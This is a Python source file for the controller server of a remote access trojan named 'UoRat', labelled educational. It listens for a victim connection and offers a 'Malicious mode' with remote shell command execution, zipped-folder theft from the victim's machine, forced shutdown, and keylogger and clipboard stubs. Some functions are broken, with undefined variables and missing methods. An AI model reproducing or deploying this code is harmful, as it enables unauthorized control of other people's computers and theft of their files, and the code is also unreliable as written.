"""
+-----------------------------------------------------------------------+
|                               UoRat                                   |
|    Author: 27016005                                                   |
|    Version: 0.2.3                                                     |
|    Last update: 25-02-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+
------- CONFIGURATION ------
In order to use this tool you need to do some tweaking:
    1. The Server's IP gets automatically set by taking the address from /etc/hosts (Linux), check if your LAN address exists in this file. I had to put it manually since there was only localhost.
    2. Select a PORT number, the default value set in the client file is 1337
    3. Play around with the paths, I've set some default values but you can change them
------ NOTE ------
This code was tested and developed on a Linux machine, it may not work on other machines.
"""

import socket
import sys
import os
import time
import random
import string


class Server:
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size

        self.connections = []  # connections list
        self.info = ""  # info about target
        self.recvcounter = 0  # counter for received files

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(2)
        self.acceptConnections()

    def acceptConnections(self):
        print(self.IP)
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)
        # # safemode

        mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(mode)
        if mode == "2":
            print("Virtuous mode")
            self.connectionconfirm()
        else:
            print("Malicious mode")
        self.commands()
        # # print("hello worlds")

    def generatekey(self):
        # Creates a password containing uppercase, lowercase, numerical digits and punctuation.
        letters = (string.ascii_letters + string.digits + string.punctuation)
        code = ''.join(random.choices(letters, k=10))
        # print("Key =  " + code)
        return code

    def connectionconfirm(self):
        key = self.generatekey()
        print("Key =  " + key)

        self.client_socket.send(key.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if response == "MISMATCH":
            self.close()

    def sendMsg(self):
        command = "msg"
        print("test")
        input()
        self.client_socket.send(command.encode())

        msg = input("[+] Enter message: ")
        time.sleep(2)
        self.client_socket.send(msg.encode())
        print(msg)
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)

    def oncoDLF(self):

        command = "sendZip"
        self.client_socket.send(command.encode("utf-8"))

        path = input("[+] Enter path (NOT A SINGLE FILE): ")
        self.client_socket.send(path.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE)
        if response.decode("utf-8") == "Success":
            # recv size
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got file ***")

                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(archive)

                print("*** File saved ***")
                self.recvcounter += 1

            else:  # # TODO For a VERY LARGE FILE
                print("very large file")
                '''Do this'''
                # Update Buffer Size, Save Big File  Then continue as above
        else:
            print("failed")
            print(response.decode("utf-8"))
            # print them
            # # print("goes wrong before here? ")


    def zipF(self):
        command = "sendZip"
        self.client_socket.send(command.encode())
        fp = input("[+] What is the filepath?: ")
        self.client_socket.send(fp.encode())
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)
        # update buffer
        buff = self.updateBuffer(size)

        # recv archive
        fullarchive = self.saveBigFile(int(size), buff)

        print("*** Got file *** ")
        with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
            output.write(fullarchive)

        print("*** File saved ***")
        self.recvcounter += 1

    def shutdown(self):
        command = "shutdown /s"
        self.client_socket.send(command.encode("utf-8"))

        self.client_socket.close()
        print(f"[!] {self.address[0]} has been Shut Down")

    def commands(self):

        while True:
         # get the command from prompt
            command = input("Enter the command you want to execute:")
            # send the command to the client
            print(command)
            # self.client_socket.send(command.encode())

            if command == "exit":
                # if the command is exit, just break out of the loop
                break

            elif command == "msg":
                # retrieve command results
                print("here2")
                input()
                self.sendMsg()

            elif command == "shell":
                self.cmdctrl()
            elif command == "sendZip":
                self.oncoDLF()
            elif command == "shutdown":
                self.shutdown()
            elif command == "disconn":
                self.client_socket.send(command.encode("utf-8"))
                print("*** Killed")
            elif command == "getInfo":  # TODO getInfo
                '''do this'''
            elif command == "MsgBox":   # TODO messagebox
                '''do this'''
            elif command == "Clipboard ":  # TODO clipboard
                '''do this'''
            elif command == "keylogger":         # TODO
                '''do this'''

            else:


                print("No Valid Command Received")
        sys.exit()
        # close connection to the client
        self.client_socket.close()
        # close server connection
        self.close()

        print(results)

    def disconn(self):
        command = "disconnect"
        self.client_socket.send(command.encode("utf-8"))
        print("*** Killed")

    def cmdctrl(self):
        """ This is not a real interactive shell, you get the output
        of the command but you can't interact with it """

        print("[!] --back to exit shell")
        while True:
            cmd = input(f"[{self.address[0]}]$ ") # can't .lower() here as sent commands may include uppercase characters

            if not cmd:
                print("[!] Can't send empty command.")
                continue

            if cmd.lower() == "--back":
                print("GO BACK")
                break

            time.sleep(2)
            command = "shell"
            self.client_socket.send(command.encode("utf-8"))
            self.client_socket.send(cmd.encode("utf-8"))

            output = self.client_socket.recv(self.BUFFER_SIZE)

            if not output:
                print("NO OUTPUT")
                input()
                self.connections.remove(self.client_socket)
                self.client_socket.close()
                self.server.close()
                break

            print(output.decode("utf-8"))

    def printOptions(self):
        '''
        msg
        shell
        sendZip
        shutdown
        disconnect
        getInfo
        '''


def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    # banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = 1337  # int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")
    # just sending a message, for demonstration purposes
    message = "Hello and Welcome".encode()
    # server.client_socket.send(message)


if __name__ == "__main__":
    main()
